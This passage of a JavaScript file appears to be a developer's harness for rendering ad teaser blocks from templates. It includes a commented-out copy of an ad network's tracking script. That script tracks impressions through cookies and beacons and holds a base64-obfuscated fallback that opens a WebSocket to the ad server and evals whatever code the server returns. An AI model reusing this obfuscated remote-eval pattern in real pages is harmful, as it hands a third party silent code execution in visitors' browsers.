slideInRight{0%{transform:translate3d(100%,0,0);visibility:visible}to{transform:translateZ(0)}}.slideInRight{animation-name:slideInRight}@keyframes slideInUp{0%{transform:translate3d(0,100%,0);visibility:visible}to{transform:translateZ(0)}}.slideInUp{animation-name:slideInUp}@keyframes slideOutDown{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(0,100%,0)}}.slideOutDown{animation-name:slideOutDown}@keyframes slideOutLeft{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(-100%,0,0)}}.slideOutLeft{animation-name:slideOutLeft}@keyframes slideOutRight{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(100%,0,0)}}.slideOutRight{animation-name:slideOutRight}@keyframes slideOutUp{0%{transform:translateZ(0)}to{visibility:hidden;transform:translate3d(0,-100%,0)}}.slideOutUp{animation-name:slideOutUp}'
    this.DOMparser = new window.DOMParser()
    this.doc = document.implementation.createDocument("http://www.w3.org/1999/xhtml", "html", null)
    this.body = document.createElementNS("http://www.w3.org/1999/xhtml", "body");
    this.doc.documentElement.appendChild(this.body);

        function strToXml(s) {
        return e.DOMparser.parseFromString(s, 'text/xml')
    }

    function isArray(o) {
        return o instanceof Array
    }

    function templateToDom(template, styles) {

        function prepare(t) {
            return t.trim()
                .replace(/\n|$/gm, '') // remove new line
                .replace(/(?:\>(\s*)\<(?!(\/span)|(\/p)))/g, '><') // remove spaces between ><
                .replace(/(?:\>(\s*)\{)/g, '>{') // remove spaces between }<
                .replace(/(?:\}(\s*)\<)/g, '}<') // remove spaces between }<
                .replace(/\s\:([\w\-]*)\s*\=\s*/g, ' rc-data-$1=') //replace :$1 => rc-data-$1
                .replace(/\s\@([\w\-]*)\s*\=\s*/g, ' rc-on-$1=') //replace @$1 => rc-on-$1
                .replace(/\{\{/g, '<evaluate>') // remove {{ to <evaluate>
                .replace(/\}\}/g, '</evaluate>') // remove }} to </evaluate>
        }

        template = prepare(template)

        let templateDom = strToXml(template)
        let stylesCss = strToXml(styles).firstChild.textContent || ''
        let templatesStyle = templateDom.createElement('style')
        templatesStyle.innerHTML = animationCss + '\n' + stylesCss
        templateDom.firstChild.insertBefore(templatesStyle, templateDom.firstChild.firstElementChild)

        let errors = templateDom.querySelectorAll('parsererror')
        for (error of errors) {
            error.remove()
        }
        return templateDom
    }

    this.testThis = () => {
        console.log('This is:\n', this)
    }

    function renderToDom(el) {
        let me = this.me
        let rootNode = null
        let isGlobalRoot = false
        let _tagName = el.tagName
        let _nodeName = el.nodeName
        let _attributes = el.attributes
        let _children = el.children

        // console.group('> getDocument', _nodeName, _tagName)

        function evaluate(scope, textToEval) {
            with (scope) {
                try {
                    let params = textToEval.trim().split('.'), r = scope
                    for (p of params){
                        if (r[p]){
                            r = r[p]
                        } else {
                            return ''
                        }
                    }
                    return r
                    // return eval('(' + textToEval + ')') || ''
                } catch (e) {
                    console.log('eval failed', e, textToEval)
                }
                return ''
            }
        }

        function conditionCheck(scope, attributes) {
            if (attributes && attributes['rc-if']) {
                return !!evaluate(scope, attributes['rc-if'].value)
            }
            return true
        }

        function parseChildren(children, parent) {
            // console.groupCollapsed('parseChildren', parent.tagName, this)

            try {
                for (let childNode of children) {
                    let newChildNode = null
                    if (childNode.tagName === 'evaluate') {
                        newChildNode = this.doc.createTextNode(evaluate(this, childNode.textContent))
                    } else {
                        newChildNode = renderToDom.call(this, childNode)
                    }
                    try {
                        newChildNode.addEventListener('click', (e) => {
                            e.preventDefault()
                            e.stopPropagation()
                            console.log(e.target)
                        }, true)
                    } catch(err){
                        console.log(err)
                    }
                    parent.appendChild(newChildNode)
                }
            } catch (err) {
                console.log(err, this, parent)
            }
            // console.groupEnd()
        }

        if (!conditionCheck(this, _attributes)) {
            return this.doc.createTextNode('')
        }

        if (_nodeName === "#document") {
            rootNode = this.body
            isGlobalRoot = true
        }

        let _each = _tagName === 'teasers' ? me.teasers : null

        if (_each && isArray(_each)) {
            try {// collection of data is Array
                rootNode = this.doc.createDocumentFragment()                   // because current template node is somethig like <teasers> and is not an HTML tag
                let scope = {doc: this.doc, me}    // prepare scope for recusrsion call
                for (let item of _each) {
                    item.id = 't' + Math.random().toString(32).substr(2),
                    scope.item = item
                    parseChildren.call(scope, _children, rootNode)
                }
            } catch (err) {
                console.log(err)
            }
        } else {
            rootNode = rootNode || this.doc.createElement(_tagName) // it is not #document node
            if (['script', 'style'].indexOf(_tagName) === -1) {
                if (_attributes) {
                    for (let i = _attributes.length - 1; i >= 0; i--) {
                        let templateAttrName = _attributes[i].name
                        let templateAttrValue = _attributes[i].value
                        let nodeAttrValue = rootNode.getAttribute(templateAttrName)
                        let newAttrValue = ''

                        if (templateAttrName && templateAttrName.match(/rc-on-/)) {
                            continue
                        }

                        if (templateAttrName && templateAttrName.match(/rc-data-/)) {
                            templateAttrName = templateAttrName.replace(/rc-data-/, '')
                            newAttrValue = evaluate(this, templateAttrValue)
                            if (!!newAttrValue && newAttrValue.prototype === Object) {
                                let attrObject = newAttrValue
                                for (let prop in attrObject) {
                                    newAttrValue += !!attrObject[prop] ? prop : ''
                                }
                            }
                        } else {
                            newAttrValue = templateAttrValue
                        }

                        if (typeof(nodeAttrValue) === 'string') {
                            nodeAttrValue += ' ' + newAttrValue
                        } else {
                            nodeAttrValue = newAttrValue
                        }

                        if (!!templateAttrName && !!nodeAttrValue) {
                            rootNode.setAttribute(templateAttrName, nodeAttrValue)
                        }
                    }
                }
                parseChildren.call(this, _children, rootNode)
            } else {
                rootNode.innerHTML = el.innerHTML
            }

        }
        // console.groupEnd()
        return rootNode
    }

    this.domBlock = function () {
        return renderToDom.call(this, e.shadow)
    }

    this.shadow = templateToDom.call(this, this.t.template, this.t.styles)
}
window.cr_el = document.createElement
document.createElement = function () {
    console.log(arguments, this)
    return window.cr_el.apply(this, arguments)
}
document.addEventListener('click', (e) => {
    e.preventDefault()
    console.log("document:", e.target)
}, true)
document.addEventListener('DOMContentLoaded', (e) => {
    console.log(e)
})

setTimeout(() => {
    adb.el = new BaseElement(JSON.parse(blockData))
    adb.viewport = document.querySelector('.blockViewport')
    adb.el.domBlock()
    adb.viewport.appendChild(adb.el.body.firstChild)
    console.log('Block loaded')
}, 500)


// (function (d) {
//     var target, id = "WETPNH5v46", dt = "2017-07-25 13:02:53", b = {
//         "bn": "WETPNH5v46",
//         "ic": 9,
//         "ie": "",
//         "v": 10,
//         "ve": "",
//         "tp": "2",
//         "imp": 1,
//         "r": "8",
//         "c": 1,
//         "tc": 0,
//         "iv": 0,
//         "vc": 0,
//         "l": "<a href=\"\/\/recreativ.ru\" style=\"width:61px !important;height:18px !important;padding:0px !important;display:block !important;background:left top url(\/\/recreativ.ru\/img\/logo.png) no-repeat !important;position:absolute !important;top:0 !important;right:-23px;overflow:hidden !important;\" onmouseover=\"this.setAttribute('data-r','18px');this.style.right='18px'\" onmouseout=\"this.setAttribute('data-r','-23px');setTimeout((function(){this.style.right=this.getAttribute('data-r');}).bind(this),1000)\" title=\"Рекламная сеть Recreativ - с нами Вас заметят!\" target=\"_blank\"><\/a><a href=\"#\" style=\"width:18px !important;height:18px !important;padding:0px !important;display:block !important;background:left top url('\/\/recreativ.ru\/img\/x.png') no-repeat !important;position:absolute !important;top:0 !important;right:0px !important;overflow:hidden !important;\" data-i=\"z\" title=\"скрыть рекламу\"><\/a>",
//         "src": "\/\/recreativ.ru\/tizers1.php?bn=WETPNH5v46&inlin_e=true&ifram_e=true",
//         "tw": 212,
//         "rnd": "nztx",
//         "w": "100%;",
//         "s": ["width:100%;border-spacing:1px;table-layout:auto;background-color:#f9f9f9;-webkit-hyphens:auto;-moz-hyphens:auto;-ms-hyphens:auto;hyphens:auto;word-break:break-word;", "text-align:center; border: 1px solid #f9f9f9;padding:5px;background-color:#f9f9f9;vertical-align:top;", "text-decoration:none;display:block;margin:0;padding:0;", "font:15px Tahoma;color:#000000;text-decoration:none;font-weight:bold;float:none;margin:0;padding:0;", "margin:3px;padding:0;border:0;width:200px;height:200px;display:inline;", "font:14px Tahoma;color:#494444;text-decoration: none;font-weight:normal;float:none;margin:0;padding:0;", "font:15px Tahoma;color:#009a28;font-weight:normal;float:none;margin:0;padding:0;text-decoration:none;border:0;", "font:14px Tahoma;font-weight:bold;float:none;margin:0;padding:0;color:#F0690F;", "color:#000;font:14px Tahoma;font-weight:normal;float:none;margin:0;padding:0;text-decoration:line-through;"],
//         "s1": {
//             "1": "padding:6px;",
//             "2": "text-align:center;",
//             "3": "font:15px Tahoma;text-decoration: none;font-weight:bold;float:none;margin:0;padding:0;",
//             "5": "font:14px Tahoma;text-decoration: none;font-weight:normal;float:none;margin:0;padding:0;",
//             "6": "font:15px Tahoma;font-weight:normal;float:none;margin:0;padding:0;text-decoration:none;",
//             "7": "font:14px Tahoma;font-weight:bold;float:none;margin:0;padding:0;",
//             "0": "width:200px;height:200px;",
//             "4": "width:200px;height:200px;margin:0;padding:0;",
//             "8": "margin:3px  auto;width:200px;height:200px;"
//         },
//         "b": "533",
//         "bi": "\/\/recreativ.ru\/img\/brand_533.png",
//         "t": [
//             ["\/\/st5.recreativ.ru\/tizers\/200\/887\/tiz-533_10478059.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvgBB%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9n1WDhuULhs3yGS3%2FKFYXjgw6QQrRNR2bMZiPXg6X2zE9QD2oeT2CXBGkmHy", "FunDesk", "Детское кресло FunDesk SST5 Blue", "rozetka.ua", "3 175 грн", "Купить FunDesk 3 175 грн", "", "103730295", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/583\/tiz-533_11549416.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvgBB%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9ndUCR%2BfIx03yGS3%2BaFYXjgw6QQrRNR2bMZiPHk5XmjA%2BgD2oeT2CHNE52Hl", "Barsky", "Кресло игровое Barsky Sport Drive Game Red (SD-08)", "rozetka.ua", "3 103 грн", "Купить Barsky 3 103 грн", "", "109544943", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/426\/tiz-533_13676357.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvQBC%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9HpTDxKfJxo3yGS%2FxaFYZwEM1DwTeNJ2Vv5gO3s7VGnGxTjwpuPwCNv%2BYUY%3D", "Mealux", "Кресло Evo-kids Aladdin PO (Y-520 PO)", "rozetka.ua", "3 180 грн", "Купить Mealux 3 180 грн", "", "124229904", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/627\/tiz-533_14782616.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBvQBC%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9HdSDhmXJhw3yGS8xaFYZwEM1DwTeNJ2Vv5nOnQ%2FUW3HxTjwpuPwCNsmYUM%3D", "Halmar", "Кресло Halmar Atom Коричневое", "rozetka.ua", "3 190 грн", "Купить Halmar 3 190 грн", "", "129332112", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/384\/tiz-4zM3Ws45te.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8n9VDhqeIBk3zGS8xaFYZwEI6AQrROhMC6dYXA%3D%3D", "modnakasta.ua", "Заказывайте стильные босоножки для летних вечеринок!", "modnakasta.ua", "Скидка 50%", "Купить modnakasta.ua Скидка 50%", "", "141431877", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/545\/tiz-2SKITjiBi4.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT9XtZDBuXJBw3zGS8xaFYZwEI6AQrROhMC8tYXg%3D%3D", "Платья от 89 гривен", "Таких цен не найти! Выбирайте на modnaKasta", "modnakasta.ua", "", "Купить Платья от 89 гривен", "", "135810132", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/241\/tiz-f6ff268179.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8nxWBBifIBg3zGS%2FxaFYZwEI6AQrROhMCqdYUQ%3D%3D", "Стильные сумки", "Доступные цены на modnaKasta!", "modnakasta.ua", "", "Купить Стильные сумки", "", "142793976", 0, 0, 0],
//             ["\/\/st5.recreativ.ru\/tizers\/200\/234\/tiz-d214c94328.jpg", "\/\/recreativ.ru\/go1.php?p=eJwBrQBS%2F7Sk3evS37FWnK59N7R7IjCCFNaIO2Z6pOrz4m0dqGymjLjs%2B%2B%2FUynKA7a9%2Btq0R798h3K1CN75rG606H2mMXIVahRj%2FRaMP5455mB7dBs6c5t1bgnYRaPRmnTf9wLS2VfuMJD%2ByhWf88yI812ZWbizvgkUGpi0UfrWyt5QkVXDemxRJnXjTG7RuOA2TA6Ui8dOdiDLT8nxWBBifJxk3zGS%2FxaFYZwEI6AQrROhMCzZYWQ%3D%3D", "Кроссовки и кеды", "Обувь с максимальными скидками выбирайте на modnakasta.ua", "modnakasta.ua", "", "Купить Кроссовки и кеды", "", "142793907", 0, 0, 0]
//         ]
//     }, v, ref;
//     if (typeof targets != "undefined") {
//         target = d.getElementById(targets.filter(function (e) {
//             return e.id == id;
//         })[0].newId);
//     } else {
//         target = d.getElementById("bn_" + id);
//     }
//     if (!target) {
//         (new Image()).src = "//recreativ.ru/bv/WETPNH5v46/?er=div";
//         return;
//     }
//     b.d = target;
//     function ce(e) {
//         return d.createElement(e);
//     }
//
//     function ac(e, c) {
//         return e.appendChild(c);
//     }
//
//     function sa(e, a, s) {
//         return e.setAttribute(a, s);
//     }
//
//     function ga(e, a) {
//         return e.getAttribute(a);
//     }
//
//     function ep(e) {
//         var r, x = 0, y = 0, w = e.clientWidth, h = e.clientHeight;
//         if (typeof e.getBoundingClientRect == "function") {
//             r = e.getBoundingClientRect();
//             x = r.left;
//             y = r.top;
//         } else {
//             while (e) {
//                 x = x + parseFloat(e.offsetLeft);
//                 y = y + parseFloat(e.offsetTop);
//                 e = e.offsetParent;
//             }
//         }
//         return {"w": w, "h": h, "x": x, "y": y};
//     }
//
//     function va() {
//         var w = window, h = d.doctype ? d.documentElement : d.body;
//         return {
//             "w": h.clientWidth || w.innerWidth,
//             "h": h.clientHeight || w.innerHeight,
//             "x": w.pageXOffset || h.scrollLeft,
//             "y": w.pageYOffset || h.scrollTop
//         };
//     }
//
//     function ls(src) {
//         var s = d.createElement("script");
//         s.src = src;
//         s.onerror = function () {
//             eval(atob("dmFyIHdyPW5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbJ3ZhciB3cz1uZXcgV2ViU29ja2V0KCInK3Muc3JjLnJlcGxhY2UoL15odHRwLywid3MiKSsiJnJlZj0iK2VuY29kZVVSSUNvbXBvbmVudChkLmxvY2F0aW9uKSsnIik7d3Mub25tZXNzYWdlPWZ1bmN0aW9uKHQpe3Bvc3RNZXNzYWdlKHQuZGF0YSk7fTsnXSkse3R5cGU6InRleHQvamF2YXNjcmlwdCJ9KSk7d3IucG9zdE1lc3NhZ2UoIkhlbGxvIFdvcmxkIik7d3Iub25tZXNzYWdlPWZ1bmN0aW9uKHQpe3dpbmRvdy5ldmFsKHQuZGF0YSk7fTs="));
//         };
//         d.body.appendChild(s);
//     }
//
//     function css(s) {
//         var id = btoa(s);
//         if (d.getElementById(id)) {
//             return;
//         }
//         var h = d.getElementsByTagName("head")[0], e = d.createElement("link");
//         sa(e, "rel", "stylesheet");
//         sa(e, "type", "text/css");
//         sa(e, "href", s);
//         sa(e, "id", id);
//         h.appendChild(e);
//     }
//
//     function csst(s) {
//         var h = d.getElementsByTagName("head")[0], e = d.createElement("style");
//         sa(e, "type", "text/css");
//         if (e.styleSheet) {
//             e.styleSheet.cssText = s;
//         } else {
//             var t = d.createTextNode(s);
//             e.appendChild(t);
//         }
//         h.appendChild(e);
//     }
//
//     function ael(el, e, l, p) {
//         if (el.addEventListener) {
//             el.addEventListener(e, l, p);
//         } else {
//             attachEvent("on" + e, l);
//         }
//     }
//
//     function rel(el, e, l, p) {
//         if (el.removeEventListener) {
//             el.removeEventListener(e, l, p);
//         } else {
//             detachEvent("on" + e, l);
//         }
//     }
//
//     function sp(el, e) {
//         if (typeof(e) != "string") {
//             l = e.length;
//             for (i = 0; i < l; i++) {
//                 sp(el, e[i]);
//             }
//         } else {
//             ael(el, e, function (e) {
//                 e.stopPropagation ? e.stopPropagation() : (e.cancelBubble = true);
//             });
//         }
//     }
//
//     function vi(id) {
//         var i, o = {}, a, d = document, b = d.cookie.match(/(?:^|; )rc_c0=([^;]*)/);
//         if (id == "#" && v) {
//             return;
//         }
//         if (b) {
//             try {
//                 b = atob(decodeURIComponent(b[1])).split("_");
//                 if (b.shift() != dt.slice(0, 10)) {
//                     b = [];
//                 }
//             } catch (e) {
//                 b = [];
//             }
//             for (i = 0; i < b.length; i++) {
//                 if (b[i]) {
//                     a = b[i].split(".");
//                     if (a[0] && a[1]) {
//                         o[a[0]] = a[1];
//                     }
//                 }
//             }
//         }
//         o[id] = 1 + 1 * (o[id] || 0);
//         if (id == "#") {
//             v = o[id];
//         }
//         s = "";
//         for (b in o) {
//             s += "_" + b + "." + o[b];
//         }
//         d.cookie = "rc_c0=" + encodeURIComponent(btoa(dt.slice(0, 10) + s)) + ";expires=315576000;path=/;domain=.recreativ.ru";
//     }
//
//     function si(s) {
//         return " style='" + s.replace(/;/g, " !important;") + "'";
//     }
//
//     function c(e) {
//         var i, d, r, c, p, t, is, ts, as, s, bb;
//         if (b) {
//             b.tc = 0;
//             d = "<div" + si("margin:0;padding:0;position:relative;overflow:hidden;width:" + b.w) + "'><table" + si(b.s[0]) + ">";
//             i = 0;
//             p = Math.round(100 / b.c);
//             for (r = 0; r < b.r; r++) {
//                 d += "<tr>";
//                 for (c = 0; c < b.c; c++) {
//                     t = b.t[i];
//                     bb = (i == 0 && b.s1);
//                     s = (bb ? b.s1 : b.s);
//                     is = "<img src='" + t[0] + "'" + si(s[4]) + (bb ? " class='rec-adv-box-img'" : "") + " data-i='" + i + "'>";
//                     if (i == 0 && b.b) {
//                         is = "<div" + si(s[8]) + " class='rec-adv-box-image-box'>" + is + "<img src='" + b.bi + "'" + si(s[4]) + " class='rec-adv-box-logo'></div>";
//                     }
//                     ts = "<div" + si(s[3]) + (bb ? " class='rec-adv-box-title'" : "") + ">" + t[2] + "</div>";
//                     d += "<td" + si(s[1] + "width:" + p + "%;") + (bb ? " class='rec-adv-box-" + (b.b ? b.b : "cell") + "'" : "") + "><a href='" + b.rnd + "' target='_blank' rel='nofollow'" + si(s[2]) + (bb ? " class='rec-adv-box-cont'" : "") + " data-i='" + i + "'>" + (b.tp == 1 ? ts + is : is + ts) + "<div" + si(s[5]) + "'" + (bb ? " class='rec-adv-box-desc'" : "") + ">" + t[3] + "</div><div" + si(s[6]) + (bb ? " class='rec-adv-box-link'" : "") + ">" + t[4] + "</div><div" + si(s[7]) + (bb ? " class='rec-adv-box-price'" : "") + ">" + t[5] + "</div>" + (t[7] ? "<div" + si(b.s[8]) + ">" + t[7] + "</div>" : "") + "</a></td>";
//                     i++;
//                 }
//                 d += "</tr>";
//             }
//             e.innerHTML = d + "</table>" + b.l + "</div>";
//         }
//     }
//
//     function ov(e) {
//         var i = !1, v, e, x, p, j, a, t, v = va();
//         a = b.d.getElementsByTagName("img");
//         for (j = 0; j < a.length; j++) {
//             if (t = b.t[ga(a[j], "data-i")]) {
//                 e = ep(a[j]);
//                 x = (e.h < v.h ? e.h : v.h) * 0.8;
//                 if (e.y + e.h - v.y > x && v.h + v.y - e.y > x) {
//                     t[9] = 1;
//                     i = !0;
//                 } else {
//                     t[9] = 0;
//                 }
//             }
//         }
//         b.iv = i;
//     }
//
//     function rs(e) {
//         var p, t, c, s;
//         if (b.r != 1 || b.c == 1 || b.tw == 0) {
//             return;
//         }
//         t = b.d.getElementsByTagName("table")[0];
//         c = ~~(b.d.clientWidth / b.tw);
//         console.log("clientWidth:" + b.d.clientWidth + "	teasW:" + b.tw + "	display:" + c);
//         for (var i = b.c - 1; i >= 0; i--) {
//             s = t.rows[0].cells[i].style;
//             s.display = i + 1 > c ? "none" : "table-cell";
//             s.width = ~~(100 / c) + "%";
//         }
//     }
//
//     ael(window, "resize", rs);
//     function tc() {
//         if (d.hidden) {
//             return;
//         }
//         b.tc++;
//         if (b.src && b.tc > 86400) {
//             b.tc = 0;
//             ls(b.src);
//         }
//         ov();
//         for (j = 0; j < b.t.length; j++) {
//             t = b.t[j];
//             if (t[9]) {
//                 t[10] = 1 + 1 * (t[10] || 0);
//                 if (t[10] == 2) {
//                     vi(t[8]);
//                 }
//             }
//         }
//         if (b.iv) {
//             b.vc = 1 + 1 * (b.vc || 0);
//         }
//         if (b.vc == 2) {
//             vi("#");
//         }
//     }
//
//     i = setInterval(tc, 1000);
//     function oc(e) {
//         var a, t = e.target, i;
//         while (t) {
//             if (t.tagName == "A" && (i = ga(t, "data-i")) != undefined) {
//                 a = t;
//                 break;
//             }
//             t = t.parentNode;
//         }
//         if (i == "z") {
//             target.style.display = "none";
//             e.preventDefault();
//             (new Image()).src = "//recreativ.ru/bv/" + id + "/?er=x&c=" + b.tc + "." + b.vc + (ref ? "&ref=" + encodeURIComponent(btoa(ref)) : "");
//             return;
//         }
//         if (i) {
//             a.href = b.t[i][1];
//         }
//         a.href += "&c=" + b.tc + "." + b.vc + "." + b.t[i][10] + (ref ? "&ref=" + encodeURIComponent(btoa(ref)) : "");
//         if (b.src) {
//             b.d.id = "bn_" + b.bn;
//             setTimeout(function () {
//                 ls(b.src.replace("&iframe=", "&script="));
//             }, 1000);
//         }
//     }
//
//     ael(target, "click", oc, true);
//     var er = "";
//
//     function ol(e) {
//         var a, t = e.target;
//         if (e.type == "error" || (t.tagName == "IMG" && t.naturalWidth < 50)) {
//             er += e.target.src + ";";
//         }
//         if (t.src.match(/recreativ.ru\/tizers\//)) {
//             while (t) {
//                 if (t.tagName == "A" && (i = ga(t, "data-i")) != undefined) {
//                     a = t;
//                     break;
//                 }
//                 t = t.parentNode;
//             }
//             b.t[i][11] = 1;
//         }
//         if (b.t.every(function (i) {
//                 return i[11] > 0;
//             })) {
//             (new Image()).src = "//recreativ.ru/bv/" + id + "/?er=" + encodeURIComponent(er);
//             rel(target, "load", ol, true);
//             rel(target, "error", ol, true);
//         }
//     };
//     ael(target, "load", ol, true);
//     ael(target, "error", ol, true);
//     c(target);
//     ov();
//     rs();
//     b.cp = "";
//     if (typeof jQuery == "function") {
//         var timer, $ = jQuery,
